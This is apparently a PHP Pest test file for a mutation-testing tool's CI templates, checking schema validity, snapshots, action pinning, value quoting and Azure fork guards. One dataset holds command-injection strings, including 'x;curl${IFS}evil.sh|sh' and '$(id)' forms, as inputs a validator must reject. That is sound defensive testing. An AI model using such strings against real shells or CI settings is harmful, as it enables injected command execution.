<?php

declare(strict_types=1);

use NightWorksIO\MutationGate\Adapter\Azure\AzurePlan;
use NightWorksIO\MutationGate\Core\CannotJudge;
use NightWorksIO\MutationGate\Core\Ci\CiTemplate;
use NightWorksIO\MutationGate\Core\Ci\GatePin;
use NightWorksIO\MutationGate\Core\Ci\GitHubWorkflow;
use NightWorksIO\MutationGate\Core\Ci\Printed;
use NightWorksIO\MutationGate\Core\Ci\TemplateValues;
use NightWorksIO\MutationGate\Core\Ci\WhichShard;
use NightWorksIO\MutationGate\Core\Composer\Installed;
use NightWorksIO\MutationGate\Core\Config\BuiltinCiPlan;
use NightWorksIO\MutationGate\Core\Config\BuiltinStore;
use NightWorksIO\MutationGate\Core\Config\Ci;
use NightWorksIO\MutationGate\Core\Config\Listed;
use NightWorksIO\MutationGate\Core\File\Contents;
use NightWorksIO\MutationGate\Core\File\Path;
use NightWorksIO\MutationGate\Core\NotGiven;
use NightWorksIO\MutationGate\Tests\Support\Schema;
use Symfony\Component\Yaml\Yaml;

/**
 * Each provider's published JSON Schema, vendored under tests/Fixtures/CiSchemas (ADR-0015 decision 17):
 *
 * - gitlab-ci.json: gitlab.com/gitlab-org/gitlab, app/assets/javascripts/editor/schema/ci.json (MIT);
 * - buildkite.json: github.com/buildkite/pipeline-schema, schema.json (MIT);
 * - circleci.json: github.com/CircleCI-Public/circleci-yaml-language-server, schema.json (Apache-2.0);
 * - github-workflow.json: json.schemastore.org/github-workflow.json (Apache-2.0), beside actionlint in CI;
 * - azure-pipelines.json: github.com/microsoft/azure-pipelines-vscode, service-schema.json (MIT).
 */
const CI_SCHEMAS = [
    'github' => 'github-workflow',
    'gitlab' => 'gitlab-ci',
    'buildkite' => 'buildkite',
    'circleci' => 'circleci',
    'azure' => 'azure-pipelines',
];

/** A rendered template's YAML, as the JSON a schema validates. */
function ciTemplateJson(string $yaml): string
{
    return (string) json_encode(Yaml::parse($yaml));
}

/**
 * The gate as Composer lists it installed from a commit of its main branch, the one
 * tests/Fixtures/CiTemplates/installed.json names: the snapshots pin it, and a pin must name a real commit.
 */
function ciTemplateGate(): GatePin
{
    $installed = Installed::decode(
        Contents::of((string) file_get_contents(Schema::at('tests/Fixtures/CiTemplates/installed.json'))),
        Path::of('vendor/composer/installed.json'),
    );

    return $installed instanceof Installed ? GatePin::in($installed) : GatePin::unknown();
}

/**
 * A template, as a project on PHP 8.5, with the default branch trunk, the runner pest and every default, fills it
 * in for the CI whose directory holds it.
 */
function ciTemplateRendered(CiTemplate $template): string
{
    [$ci] = explode('/', $template->value);
    $values = TemplateValues::of(
        '8.5',
        'trunk',
        ciTemplateGate(),
        'pest',
        Ci::none()->check(),
        CiTemplate::included(BuiltinCiPlan::from($ci), Ci::none()),
    );
    $text = (string) file_get_contents(Schema::at(sprintf('resources/ci/%s', $template->value)));

    return $values instanceof TemplateValues ? $values->rendered($text) : throw new LogicException($values->why());
}

it('renders each CI\'s templates, the GitHub one as the estimate or the request picks it', function (): void {
    $single = GitHubWorkflow::Single;

    expect(CiTemplate::for(BuiltinCiPlan::GitHub, $single))->toEqual(Listed::of(CiTemplate::GitHubSingle))
        ->and(CiTemplate::for(BuiltinCiPlan::GitHub, GitHubWorkflow::Sharded))->toEqual(Listed::of(CiTemplate::GitHubSharded))
        ->and(CiTemplate::for(BuiltinCiPlan::GitLab, $single))->toEqual(Listed::of(CiTemplate::GitLabTemplate, CiTemplate::GitLabJobs))
        ->and(CiTemplate::for(BuiltinCiPlan::Buildkite, $single))
        ->toEqual(Listed::of(CiTemplate::BuildkitePipeline, CiTemplate::BuildkiteUpload))
        ->and(CiTemplate::for(BuiltinCiPlan::CircleCi, $single))->toEqual(Listed::of(CiTemplate::CircleCi))
        ->and(CiTemplate::for(BuiltinCiPlan::Azure, $single))->toEqual(Listed::of(CiTemplate::AzureJobs, CiTemplate::AzureInclude))
        ->and(CiTemplate::for(BuiltinCiPlan::Json, $single))->toEqual(Listed::of());
});

it('names the file of the gate\'s jobs that the lines it prints pull in, where the CI\'s definition is more than one', function (): void {
    $ci = Ci::of(gitlabTemplate: Path::of('ci/gate.yml'));

    expect(array_map(
        static fn(BuiltinCiPlan $plan): string => ($included = CiTemplate::included($plan, $ci)) instanceof Path
            ? $included->value()
            : 'none',
        BuiltinCiPlan::cases(),
    ))->toBe(['none', 'ci/gate.yml', '.buildkite/mutation-gate.yml', 'none', '.azure/mutation-gate.yml', 'none']);
});

it('writes a definition to a file of its own, and prints one that belongs in a file the CI reads', function (): void {
    $ci = Ci::of(gitlabTemplate: Path::of('ci/gate.yml'));

    expect(array_map(
        static fn(CiTemplate $template): string => ($where = $template->destination($ci)) instanceof Printed
            ? sprintf('printed into %s', $where->file())
            : $where->value(),
        CiTemplate::cases(),
    ))->toBe([
        '.github/workflows/mutation.yml',
        '.github/workflows/mutation.yml',
        'ci/gate.yml',
        'printed into .gitlab-ci.yml',
        '.buildkite/mutation-gate.yml',
        'printed into the pipeline Buildkite runs',
        'printed into .circleci/config.yml',
        '.azure/mutation-gate.yml',
        'printed into azure-pipelines.yml',
    ]);
});

it('fills in every placeholder, and renders YAML the provider\'s published schema accepts', function (
    CiTemplate $template,
): void {
    $text = ciTemplateRendered($template);
    [$provider] = explode('/', $template->value);
    $schema = Schema::at(sprintf('tests/Fixtures/CiSchemas/%s.json', CI_SCHEMAS[$provider]));

    expect($text)->not->toContain('%%')
        ->and(Schema::errors(ciTemplateJson($text), $schema))->toBe([]);
})->with(CiTemplate::cases());

it('renders each template as its snapshot', function (CiTemplate $template): void {
    expect(ciTemplateRendered($template))->toBe((string) file_get_contents(Schema::at(sprintf('tests/Fixtures/CiTemplates/%s', $template->value))));
})->with(CiTemplate::cases());

it('pins each action a template uses by the commit the package\'s own workflows use, and the gate by its own', function (
    CiTemplate $template,
): void {
    $pins = [];

    $workflows = glob(Schema::at('.github/workflows/*.yml'));

    foreach (is_array($workflows) ? $workflows : [] as $workflow) {
        preg_match_all('/uses: ([\w.-]+\/[\w.-]+)@([0-9a-f]{40}) # (\S+)/', (string) file_get_contents($workflow), $used, PREG_SET_ORDER);

        foreach ($used as [, $action, $commit, $tag]) {
            $pins[$action] = sprintf('%s # %s', $commit, $tag);
        }
    }

    $text = (string) file_get_contents(Schema::at(sprintf('resources/ci/%s', $template->value)));
    preg_match_all('/uses: ([\w.-]+\/[\w.-]+)@(\S+ # \S+)/', $text, $templated, PREG_SET_ORDER);
    $others = array_filter($templated, static fn(array $use): bool => $use[1] !== 'nightworksio/php-mutation-gate');
    $gate = substr_count($text, '@%%pin%%');

    expect(count($others) + $gate)->toBe(substr_count($text, 'uses: '));

    foreach ($others as [, $action, $pin]) {
        expect($pins[$action] ?? 'not used by the package\'s workflows')->toBe($pin);
    }
})->with(CiTemplate::cases());

it('refuses a value a shell or YAML would read as code, from whichever setting it comes', function (
    string $branch,
    string $runner,
    string $template,
    string $check,
    string $why,
): void {
    expect(TemplateValues::of('8.5', $branch, GatePin::unknown(), $runner, $check, Path::of($template)))
        ->toEqual(CannotJudge::because(sprintf(
            '%s cannot go into a CI definition, where a shell or YAML reads it as code. %s',
            ...explode(' | ', $why),
        )));
})->with([
    'a command in the branch' => ['main$(id)', 'pest', 'x.yml', 'c', 'The default branch "main$(id)" | Set ci.defaultBranch to a name of letters, digits and ._/-.'],
    'a command chained after the branch' => ['x;curl${IFS}evil.sh|sh', 'pest', 'x.yml', 'c', 'The default branch "x;curl${IFS}evil.sh|sh" | Set ci.defaultBranch to a name of letters, digits and ._/-.'],
    'a quote in the branch' => ["it's", 'pest', 'x.yml', 'c', 'The default branch "it\'s" | Set ci.defaultBranch to a name of letters, digits and ._/-.'],
    'backticks in the branch' => ['a`id`', 'pest', 'x.yml', 'c', 'The default branch "a`id`" | Set ci.defaultBranch to a name of letters, digits and ._/-.'],
    'a quote in the runner' => ['main', "pest'", 'x.yml', 'c', 'The runner "pest\'" | Choose a runner by a name of letters, digits and ._-.'],
    'a quote in the template' => ['main', 'pest', "a'b.yml", 'c', 'The file "a\'b.yml" | Set ci.gitlab.template to a path of letters, digits and ._/-.'],
    'a command in the check' => ['main', 'pest', 'x.yml', 'x$(id)', 'The check "x$(id)" | Set ci.check to a name of letters, digits, spaces and ._/-.'],
]);

it('takes a runner a class names, and a check with spaces', function (): void {
    expect(TemplateValues::of('8.5', 'release/2.x', GatePin::unknown(), '\\Acme\\Runner', 'mutation / verdict', Path::of('ci/gate.yml')))
        ->toBeInstanceOf(TemplateValues::class);
});

it('leaves the file of the gate\'s jobs unchecked and unfilled where the CI\'s definition is one file', function (): void {
    $values = TemplateValues::of('8.5', 'main', GatePin::unknown(), 'pest', 'c', NotGiven::value());

    expect($values)->toBeInstanceOf(TemplateValues::class)
        ->and($values instanceof TemplateValues ? $values->rendered('%%included%% %%runner%%') : '')->toBe('%%included%% pest');
});

it('quotes every value a project gives wherever a template holds it, and runs none in a shell line', function (
    CiTemplate $template,
): void {
    $lines = explode("\n", (string) file_get_contents(Schema::at(sprintf('resources/ci/%s', $template->value))));
    $unquoted = array_filter($lines, static fn(string $line): bool => ! str_starts_with(trim($line), '#')
        && preg_match("/(?<!')%%(branch|runner|included|check)%%|%%(branch|runner|included|check)%%(?!')/", $line) === 1);

    expect(array_values($unquoted))->toBe([]);
})->with(CiTemplate::cases());

it('names the one-step action\'s job for the check the verdict reports under', function (): void {
    expect(ciTemplateRendered(CiTemplate::GitHubSingle))->toContain(sprintf("    name: '%s'\n", Ci::none()->check()));
});

it('keeps a status check in every condition of Azure\'s jobs, so no step runs after a cancel', function (): void {
    preg_match_all('/condition: (.+)$/m', ciTemplateRendered(CiTemplate::AzureJobs), $conditions);

    expect($conditions[1])->not->toBe([]);

    foreach ($conditions[1] as $condition) {
        expect($condition)->toMatch('/\b(succeeded|succeededOrFailed|failed|always|canceled)\(\)/');
    }
});

it('reads the plan\'s matrix from the output the Azure plan sets, and each leg\'s shard from its variable', function (): void {
    $jobs = ciTemplateRendered(CiTemplate::AzureJobs);

    expect($jobs)->toContain("        name: gate\n")
        ->and($jobs)->toContain(sprintf("dependencies.mutation_plan.outputs['gate.%s']", AzurePlan::OUTPUT))
        ->and($jobs)->toContain(sprintf("ne(variables.%s, '')", WhichShard::VARIABLE))
        ->and($jobs)->toContain(sprintf('mutation-results-$(%s)', WhichShard::VARIABLE));
});

it('drops every variable the bucket store reads in the Azure plan and verdict steps of a fork\'s build, before the gate runs', function (): void {
    $guard = sprintf(
        'if [ "${SYSTEM_PULLREQUEST_ISFORK:-}" = "True" ]; then unset %s; fi',
        implode(' ', [...BuiltinStore::S3->variables()]),
    );
    $jobs = ciTemplateRendered(CiTemplate::AzureJobs);

    foreach (['vendor/bin/mutation-gate plan', 'vendor/bin/mutation-gate verdict'] as $gate) {
        $step = substr($jobs, 0, (int) strpos($jobs, $gate));

        expect(substr($step, (int) strrpos($step, '- bash: |')))->toContain($guard);
    }
});

it('names every variable the bucket store reads in the README, where a fork\'s build drops them on Azure', function (): void {
    $readme = (string) file_get_contents(Schema::at('README.md'));
    $named = implode(', ', array_map(static fn(string $variable): string => sprintf('`%s`', $variable), [...BuiltinStore::S3->variables()]));

    expect($readme)->toContain(sprintf('drop every variable the S3 store reads, %s,', $named));
});
